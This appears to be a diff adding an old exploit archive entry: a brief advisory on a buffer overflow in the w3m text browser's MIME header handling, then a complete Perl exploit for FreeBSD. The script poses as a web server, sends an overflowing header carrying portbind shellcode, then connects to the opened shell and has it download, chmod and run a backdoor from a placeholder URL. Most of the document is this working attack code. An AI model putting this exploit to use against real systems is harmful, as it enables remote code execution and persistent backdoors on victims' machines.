@@ -1,0 +1,68 @@
+source: http://www.securityfocus.com/bid/2895/info
+
+W3M is a pager/text-based WWW browser similiar to lynx.
+
+A buffer overflow vulnerability exists in the 'w3m' client program. The overflow occurs when a base64-encoded string exceeding approximately 32 characters in length is received in a MIME header field. As a result, it may be possible for a malicious remote server to execute arbitrary code on a user's system. 
+
+#!/usr/bin/perl
+
+# ---- exp_w3m.pl
+# w3m remote buffer overflow exploit for FreeBSD.
+# this fake httpd gives exploit code to visitor's w3m, then
+# connects to victim's port 10000, downloads backdoor from
+# $backdoor, and executes it.
+# see also:
+# ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-01:46.w3m.asc
+# 
+# 					White_E <white_e@bigfoot.com>
+# 					http://ttj.virtualave.net/
+
+$backdoor='http://www.../any.backdoor.prog.you.want';
+$ret = 0xbfbffa2c;
+$ret -= $ARGV[0];
+$retb = pack("V",$ret); # little endian
+
+$shellcode= # http://www.hack.co.za/download.php?sid=1444
+            # portbind shell on 10000 by bighawk
+"\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89".
+"\xc3\x52\x66\x68\x27\x10\x66\x51\x89\xe6\xb1\x10\x51\x56\x50".
+"\x50\xb0\x68\xcd\x80\x51\x53\x53\xb0\x6a\xcd\x80\x52\x52\x53".
+"\x53\xb0\x1e\xcd\x80\xb1\x03\x89\xc3\xb0\x5a\x49\x51\x53\x53".
+"\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69".
+"\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80"; # 86 bytes
+
+use Socket;
+$port=80;
+$|=1;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
+select(S);$|=1;select(STDOUT);
+setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
+$paddr=sockaddr_in($port,INADDR_ANY);
+bind(S,$paddr) || die "ERR: bind()\n";
+listen(S,SOMAXCONN) || die "ERR: listen()\n";
+print "listen on $port.\n";
+$str  = "A" x 36;
+$str .= $retb;
+$str .= "\x90" x 128;
+$str .= $shellcode;
+
+while (1) {
+  $victim=accept(VIC,S);
+  $vaddr=(sockaddr_in($victim))[1];
+  select(VIC);$|=1;select(STDOUT);
+  $in=<VIC>;
+  $in=<VIC>;
+  print VIC "HTTP/1.0 200 OK\r\n";
+  print VIC "MIME-Version: 1.0\r\n";
+  print VIC "Content-Type: multipart/mixed; boundary=\"__=?$str\r\n";
+  print VIC "\r\n";
+  sleep(1);
+  socket(BD,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
+  $paddr=sockaddr_in('10000',$vaddr) || die "ERR: sockaddr_in\n";
+  connect(BD,$paddr) || die "ERR: connect()\n";
+  select(BD);$|=1;select(STDOUT);
+  print BD "/usr/local/bin/w3m -dump_source $backdoor > /tmp/hoge \; /bin/chmod +x /tmp/hoge \; 
+/tmp/hoge & \n";
+  print "backdoor has been set.\n";
+  close(BD);
+}
